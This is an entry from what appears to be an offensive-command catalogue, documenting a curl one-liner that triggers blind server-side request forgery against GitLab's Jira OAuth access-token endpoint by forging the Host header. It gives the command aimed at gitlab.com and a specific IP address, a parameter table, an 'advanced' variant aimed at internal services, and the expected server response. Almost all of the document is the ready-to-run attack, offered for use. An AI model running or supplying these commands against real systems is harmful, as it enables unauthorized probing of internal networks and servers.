---
id: cmd-uuid-001
data: >-
  curl -X POST -H 'Host: 162.243.147.21:81'
  'https://gitlab.com/-/jira/login/oauth/access_token'
tags:
  - ssrf
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.401Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-gitlab-ssrf

## Command

```bash
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

## Description

Sends a POST request to GitLab's vulnerable Jira OAuth endpoint with a manipulated Host header to trigger blind SSRF, forwarding the request to the specified internal IP and port.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H 'Host: 162.243.147.21:81'` | Forges Host header to target internal host/port for SSRF | Yes |
| `'https://gitlab.com/-/jira/login/oauth/access_token'` | Target vulnerable endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

### Advanced Usage

```bash
curl -X POST -H 'Host: internal.service:443' -d 'param=value' 'https://target-gitlab/-/jira/login/oauth/access_token' --insecure
```

## Expected Output

Triggers internal POST to 162.243.147.21:81; GitLab responds with JSON like {"access_token":null,"scope":null,"token_type":"bearer"}, but delays ~60 seconds on TCP timeout.

## Related

- [[Related Procedure|procedures/Trigger-SSRF-with-Manipulated-Host-Header]]
